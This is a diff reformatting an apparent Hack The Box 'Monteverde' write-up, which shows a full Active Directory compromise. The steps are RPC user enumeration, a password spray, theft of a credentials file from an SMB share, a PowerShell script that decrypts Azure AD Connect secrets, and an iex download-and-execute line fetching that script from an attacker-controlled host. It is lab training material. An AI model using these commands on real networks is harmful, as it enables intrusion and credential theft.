@@ -6,7 +6,7 @@ summary: "Azure AD Connect is a powerful tool, but in the hands of an attacker, 
 tags: ["Red Team", "Active Directory", "Azure AD", "HTB", "Privilege Escalation"]
 categories: ["Offensive Operations"]
 series: ["Active Directory Exploitation"]
-image: "/images/monteverde.png"
+featureImage: "images/monteverde.png"
 showTableOfContents: true
 draft: false
 ---
@@ -25,20 +25,16 @@ We start with a full port sweep. On a Windows target, I’m looking for the "Big
 
 ### Nmap Discovery
 
-Bash
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.172   `
+```bash
+root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.172
+```
 
 The scan returns 19 open ports. The ones that matter for our initial foothold are:
 
 *   **53/tcp (DNS)**
-    
 *   **88/tcp (Kerberos)**
-    
 *   **389/tcp (LDAP)**
-    
 *   **445/tcp (SMB)**
-    
 *   **5985/tcp (WinRM)**
     
 
@@ -51,9 +47,10 @@ SMB guest access was a bust, so I moved to **RPC (port 135/445)**. If the config
 
 ### The RPC Connection
 
-Bash
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# rpcclient -U "" -N 10.10.10.172  rpcclient $> querydispinfo   `
+```bash
+root@kali# rpcclient -U "" -N 10.10.10.172  
+rpcclient $> querydispinfo
+```
 
 The server leaked several interesting accounts:
 
@@ -79,9 +76,9 @@ With a solid list of usernames, the next logical step is a **Password Spray**. I
 
 I put the usernames in a file and let crackmapexec do the heavy lifting:
 
-Bash
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success   `
+```bash
+root@kali# crackmapexec smb 10.10.10.172 -u users -p users --continue-on-success
+```
 
 **Result:** \[+\] MEGABANK.LOCAL\\SABatchJobs:SABatchJobs
 
@@ -94,23 +91,29 @@ Now that I have a valid session as SABatchJobs, I revisited the SMB shares to se
 
 ### Share Enumeration
 
-Bash
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'   `
+```bash
+root@kali# smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R 'users$'
+```
 
 In the users$ share, specifically under \\mhope\\, I found a very interesting file: azure.xml.
 
 ### Exfiltrating the XML
 
-Bash
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# smbclient -U SABatchJobs //10.10.10.172/users$ -c 'get mhope/azure.xml azure.xml'   `
+```bash
+root@kali# smbclient -U SABatchJobs //10.10.10.172/users$ -c 'get mhope/azure.xml azure.xml'
+```
 
 Checking the content of azure.xml:
 
-XML
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML            `4n0therD4y@n0th3r$`      
+```XML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <Props>
+      <S N="Password">4n0therD4y@n0th3r$</S>
+    </Props>
+  </Obj>
+</Objs>      
+```
 
 We just found Mike Hope’s password: **4n0therD4y@n0th3r$**.
 
@@ -118,9 +121,10 @@ We just found Mike Hope’s password: **4n0therD4y@n0th3r$**.
 
 I verified these credentials over WinRM (port 5985):
 
-Bash
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'  WINRM   10.10.10.172   5985   MONTEVERDE   [+] MEGABANK\mhope:4n0therD4y@n0th3r$ (Pwn3d!)   `
+```bash
+root@kali# crackmapexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
+WINRM   10.10.10.172   5985   MONTEVERDE   [+] MEGABANK\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
+```
 
 Using Evil-WinRM, I logged in and grabbed the user flag from C:\\Users\\mhope\\desktop\\user.txt.
 
@@ -147,18 +151,40 @@ I used a PowerShell POC that performs these steps:
     
 4.  Uses C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\mcrypt.dll to perform the decryption.
     
+```bash
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
+$client.Open()
 
-PowerShell
 
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"  $client.Open()  # [Fetch Key Info]  $cmd = $client.CreateCommand()  $cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"  $reader = $cmd.ExecuteReader()  # ... (reader logic) ...  # [Fetch Config & Encrypted Creds]  $cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"  # ... (reader logic) ...  # [Decryption logic using mcrypt.dll]  add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'  $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager  $km.LoadKeySet($entropy, $instance_id, $key_id)  # ... (decryption calls) ...   `
+# [Fetch Key Info]
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+# ... (reader logic) ...
+
+
+# [Fetch Config & Encrypted Creds]
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+# ... (reader logic) ...
+
+
+# [Decryption logic using mcrypt.dll]
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+# ... (decryption calls) ...
+```
 
 ### Execution
 
 Running the script on the target:
 
-PowerShell
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   *Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')  Domain: MEGABANK.LOCAL  Username: administrator  Password: d0m@in4dminyeah!   `
+```bash
+*Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring('http://10.10.14.11/Get-MSOLCredentials.ps1')
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+```
 
 It turns out that on this box, the administrator account itself was used for the sync service.
 
@@ -166,9 +192,9 @@ It turns out that on this box, the administrator account itself was used for the
 
 I used the newly found password to log in as the Domain Admin:
 
-Bash
-
-Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   root@kali# evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'   `
+```bash
+root@kali# evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
+```
 
 **Root flag located at:** C:\\Users\\Administrator\\desktop\\root.txt.
 
